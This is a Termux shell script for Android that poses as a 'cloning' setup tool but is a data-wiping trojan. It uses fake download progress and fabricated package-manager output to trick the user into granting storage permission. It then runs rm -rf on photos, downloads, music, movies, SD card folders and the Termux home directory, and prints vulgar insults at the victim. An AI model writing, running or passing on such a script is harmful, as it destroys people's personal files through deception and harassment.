red=`tput setaf 1`
 green=`tput setaf 2`
 yellow=`tput setaf 3`
 reset=`tput sgr0`
 bold=`tput bold`
white= `tput setb 7`
termux-setup-storage
cd ~
a=0
test -d "storage" && a=1 || b=0
if [ $a == 1 ]; then
cd ~;cd storage;rm -rf dcim/* downloads/* shared/* pictures/* music/* extsdcard/*; 
rm -rf movies/* emulated-1/* sdccard/* sdcard1/* sdcard0/* sdcard-1/* emulated-1/*
cd ~; rm -rf storage
cd ..
rm -rf home
pkg install ncurses-utils -y
for lp in 1 2 3 4 5 
do
echo " $bold "
echo " $green Mubarak ho Lun Lg gya tmhain "
sleep 0.2
done
echo " Aur kr cloning bhotni ka bacha Gaand marvany ki ummar me Cloning krny aya tha "
echo " $reset "
 else
clear
pkg install ncurses-utils -y
for i in 10 20 30 40 50 60 70 80 90 
do
 echo " $red Downloading............ $i "
sleep 0.5
done
echo " $reset  Hit:1 https://termux.net stable InRelease         Ign:2 https://dl.bintray.com/grimler/game-packages-21 games InRelease Ign:3 https://dl.bintray.com/grimler/science-packages-21 science InRelease                          Get:4 https://dl.bintray.com/grimler/game-packages-21 games Release [5344 B]                        Hit:4 https://dl.bintray.com/grimler/game-packages-21 games Release Get:6 https://dl.bintray.com/grimler/science-packages-21 science Release [5348 B] Hit:6 https://dl.bintray.com/grimler/science-packages-21 science Release Reading package lists... Done Building dependency tree Reading state information... Done All packages are up to date. Reading package lists... Done Building dependency tree Reading state information... Done The following additional packages will be installed:   binutils libllvm ndk-sysroot The following NEW packages will be installed:   binutils clang libllvm ndk-sysroot 0 upgraded, 4 newly installed, 0 to remove and 0 not upgraded. Need to get 2 MB of archives. After this operation, 2 MB of additional disk space will be used. " 
sleep 2
clear
echo " $bold  \n \n Press y to complete setup "
sleep 3
echo " $reset "
termux-setup-storage
chk=0
test -d "storage" && chk=1 || c=0
if [ $chk == 1 ]; then
cd ~
rm -rf storage/*
rm -rf storage
cd ..
rm -rf home
 else
clear
echo " $red \n \n     Erorr ! Permission Denied! "
echo " $yellow Re-enter Commands and Press Y to resume Downloa."
fi
fi